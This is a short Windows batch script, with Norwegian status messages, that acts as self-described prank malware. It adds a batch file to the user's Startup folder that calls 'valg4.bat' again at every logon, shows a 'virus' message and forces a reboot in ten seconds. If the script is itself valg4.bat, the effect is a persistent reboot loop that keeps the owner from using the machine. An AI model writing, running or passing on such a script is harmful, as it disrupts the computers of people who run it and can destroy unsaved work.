@echo off
echo Legger til batch script i oppstartsfilen...
echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\valg4.bat"
echo cd %~dp0 >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\valg4.bat"
echo call valg4.bat >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\valg4.bat"
echo Batch script lagt til i oppstartsfilen.

msg * "virus"

shutdown -r -t 10 -c "Common L"

exit